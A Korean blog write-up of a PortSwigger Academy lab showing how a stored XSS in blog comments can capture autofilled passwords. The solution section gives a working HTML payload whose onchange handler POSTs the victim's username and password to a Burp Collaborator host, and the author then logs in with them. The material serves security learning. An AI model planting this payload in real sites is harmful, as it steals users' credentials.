---
layout: post
title: "Burp Academy-XSS 취약점: Exploiting cross-site scripting to capture passwords"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, XSS취약점]
toc: true
last_modified_at: 2024-08-26 21:55:00 +0900
---

# 개요
- Reflected 타입의 XSS 취약점 문제이다.
- 취약점 설명 주소: https://portswigger.net/web-security/cross-site-scripting/exploiting
- 문제 주소: https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords
- 난이도: PRACTITIONER (보통)

# 취약점 설명
요즘 많은 사용자가 비밀번호를 자동으로 채워주는 비밀번호 관리자를 사용한다. 비밀번호 입력을 만들고, 자동으로 채워진 비밀번호를 읽어서 자신의 도메인으로 보내면 이를 활용할 수 있다. 이 기술은 쿠키를 훔치는 것과 관련된 대부분의 문제를 피할 수 있으며, 피해자가 동일한 비밀번호를 재사용한 다른 모든 계정에 액세스할 수도 있다.

이 기술의 가장 큰 단점은 비밀번호 자동 채우기를 수행하는 비밀번호 관리자가 있는 사용자에게만 작동한다는 것이다. (물론 사용자가 비밀번호를 저장하지 않은 경우에도 온사이트 피싱 공격을 통해 비밀번호를 얻으려고 시도할 수 있지만, 완전히 똑같지는 않다.)

# 문제
- 이 사이트의 블로그의 댓글 기능에 Stored타입의 XSS취약점이 존재한다. 
- victim은 모든 댓글을 확인한다. 
- 랩을 풀려면 victim의 유저명과 패스워드를 알아내서 victim으로 로그인하면 된다. 
- Note:  Burp Collaborator 의 공식 서버를 사용해야 한다. 

```
This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.

Note
To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

Some users will notice that there is an alternative solution to this lab that does not require Burp Collaborator. However, it is far less subtle than exfiltrating the credentials.
```

# 풀이 
1. Burp Professional에서 Collaborator 탭 Copy to clipboard를 클릭해 Burp Collaborator URL을 획득해둔다. 

`qnhv0ture1efjpdh2az4qqpn3e95xvlk.oastify.com`

2. 댓글 저장시에 다음 페이로드가 저장되도록 한다. 

```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://qnhv0ture1efjpdh2az4qqpn3e95xvlk.oastify.com',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

다음과 같이 댓글에 페이로드를 붙여넣기 해서 저장한다. 

![](/images/burp-academy-xss-15-2.png)


3. Collaborator 를 확인한다. HTTP 통신 내용이 보인다. 관리자의 계정과 패스워드가 보인다! 이는 victim유저가 이 댓글을 확인할 때 패스워드 매니저에 의해 이 사이트의 username과 password가 자동으로 입력되기 때문이다. **유저명과 패스워드 자동입력은 편리한 기능이지만 XSS가 있는 사이트와 결합되면 아주 위험해진다**는 것을 알 수 있었다. 

![](/images/burp-academy-xss-15-3.png)

4. 이 계정과 패스워드를 사용해서 로그인하면 랩이 풀린다. 

![](/images/burp-academy-xss-15-success.png)
